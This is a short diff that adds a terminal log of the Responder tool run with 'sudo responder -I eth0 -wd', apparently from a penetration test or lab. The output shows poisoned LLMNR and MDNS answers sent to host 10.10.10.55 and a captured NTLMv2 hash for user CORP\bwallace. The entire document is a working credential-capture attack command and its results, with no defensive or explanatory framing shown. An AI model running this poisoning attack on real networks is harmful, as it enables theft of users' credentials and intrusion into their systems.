@@ -1,0 +1,8 @@
+$ sudo responder -I eth0 -wd
+[+] Listening for events...
+
+[*] [LLMNR]  Poisoned answer sent to 10.10.10.55 for name fileserver
+[*] [MDNS] Poisoned answer sent to 10.10.10.55  for name fileserver.local
+[SMB] NTLMv2-SSP Client   : 10.10.10.55
+[SMB] NTLMv2-SSP Username : CORP\bwallace
+[SMB] NTLMv2-SSP Hash     : bwallace::CORP:1122334455667788:9A8B7C6D5E4F3A2B1C0D9E8F7A6B5C4D:0101000000000000C0653150DE09D2010011223344556677889900AABBCCDDEEFF
